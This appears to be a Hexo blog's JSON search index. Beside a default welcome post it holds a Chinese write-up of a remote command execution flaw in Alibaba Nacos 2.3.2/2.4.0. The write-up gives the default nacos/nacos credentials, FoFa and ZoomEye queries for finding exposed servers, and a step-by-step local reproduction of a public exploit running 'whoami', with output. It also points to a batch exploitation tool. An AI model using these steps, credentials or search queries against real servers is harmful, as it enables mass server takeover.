[{"title":"Hello World","url":"/2024/07/09/hello-world/","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new &quot;My New Post&quot;\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\n"},{"url":"/2024/07/16/Nacos-command-injection/","content":"[0day] Alibaba Nacos远程命令执行漏洞\ntitle: [0day] Alibaba Nacos远程命令执行漏洞\ndate: \ntags: Cms Web Command-Injection\ncategory: Web Security\n\n\n一.NacosNacos（官方网站：nacos.io）是一个易于使用的平台，专为动态服务发现、配置和服务管理而设计。帮助您轻松构建云原生应用和微服务平台。\n服务是Nacos的第一特色。Nacos 支持几乎所有类型的服务，例如 Dubbo&#x2F;gRPC 服务、Spring Cloud RESTFul 服务或 Kubernetes 服务。\nNacos 提供四大功能：\n    1.服务发现和服务运行状况检查\n    2.动态配置管理\n    3.动态的DNS服务\n    4.服务和元数据管理\n具体信息可参考: alibaba nacos\n二.漏洞描述2024年7月15日下午5点多，有人在github上发布了Nacos的远程命令执行漏洞，并且在仓库当中给出了EXP。攻击者可以先通过弱口令进入到Nacos的后台(默认用户:nacos,默认密码:nacos)，进而利用该漏洞进行远程命令执行，控制服务器。\n影响版本:    Nacos2.3.2\n    Nacos2.4.0\n项目地址    1.exp(原作者已经删除了项目，这是克隆项目)\n    2.Nacos_Rce\n三.网络空间搜索引擎FoFa: icon_hash&#x3D;”13942501”\nZoomEye: app:”Alibaba Nacos”\n四.漏洞复现注意: 以下展示的是Linux环境下面的情况，Windows大同小异\n1.克隆项目到本地\nsw0n@sw0n:~/cve$ git clone https://github.com/HACK-THE-WORLD/nacos-poc.git正克隆到 &#x27;nacos-poc&#x27;...remote: Enumerating objects: 9, done.remote: Counting objects: 100% (9/9), done.remote: Compressing objects: 100% (7/7), done.remote: Total 9 (delta 1), reused 0 (delta 0), pack-reused 0接收对象中: 100% (9/9), 5.77 KiB | 5.77 MiB/s, 完成.处理 delta 中: 100% (1/1), 完成.\n\n2.pip -m install requirement.txt(或者下面这样)\nsw0n@sw0n:~/cve/nacos-poc$ pip install requestssw0n@sw0n:~/cve/nacos-poc$ pip install flask\n\n3.到官网的github上下载Nacos受影响的版本\nsw0n@sw0n:~/cve$ wget https://github.com/alibaba/nacos/releases/download/2.4.0-BETA/nacos-server-2.4.0-BETA.zip\n\n4.在下面命令中的相对目录当中启动Nacos(注意Linux和Windows的区别)\nsw0n@sw0n:~/cve/nacos/bin$ bash startup.sh -m standalone/usr/lib/jvm/java-18-openjdk-amd64/bin/java   -server  -Xms2g -Xmx2g -Xmn1g -XX:MetaspaceSize=128m -XX:MaxMetaspaceSize=320m -XX:-OmitStackTraceInFastThrow -XX:+HeapDumpOnOutOfMemoryError -XX:HeapDumpPath=/home/sw0n/cve/nacos/logs/java_heapdump.hprof -XX:-UseLargePages -Dnacos.member.list= -Xlog:gc*:file=/home/sw0n/cve/nacos/logs/nacos_gc.log:time,tags:filecount=10,filesize=100m -Dloader.path=/home/sw0n/cve/nacos/plugins,/home/sw0n/cve/nacos/plugins/health,/home/sw0n/cve/nacos/plugins/cmdb,/home/sw0n/cve/nacos/plugins/selector -Dnacos.home=/home/sw0n/cve/nacos -jar /home/sw0n/cve/nacos/target/nacos-server.jar  --spring.config.additional-location=file:/home/sw0n/cve/nacos/conf/ --logging.config=/home/sw0n/cve/nacos/conf/nacos-logback.xml --server.max-http-header-size=524288nacos is starting with clusternacos is starting. you can check the /home/sw0n/cve/nacos/logs/start.oumt\n\n\n5.修改nacos-poc中的config.py，只要不与nacos服务器的8848冲突即可\n\n6.运行nacos-poc中的service.py\nsw0n@sw0n:~/cve/nacos-poc-main$ python3 service.py  * Serving Flask app &#x27;service&#x27; * Debug mode: offWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead. * Running on http://127.0.0.1:5000Press CTRL+C to quit\n\n7.运行naos-poc中的exploit.py\nsw0n@sw0n:~/cve/nacos-poc$ python3 exploit.py 请输入目录URL，默认：http://127.0.0.1:8848：请输入命令，默认：calc：whoami&#123;&quot;code&quot;:200,&quot;message&quot;:null,&quot;data&quot;:&quot;&quot;&#125;&#123;&quot;code&quot;:200,&quot;message&quot;:null,&quot;data&quot;:[&#123;&quot;B&quot;:0,&quot;A&quot;:&quot;sw0n&quot;&#125;]&#125;\n\n五.Nacos_Rce-Src-批量利用工具详情可以看\n    Nacos_Rce\n这里只是本地演示一下\n\n\n"}]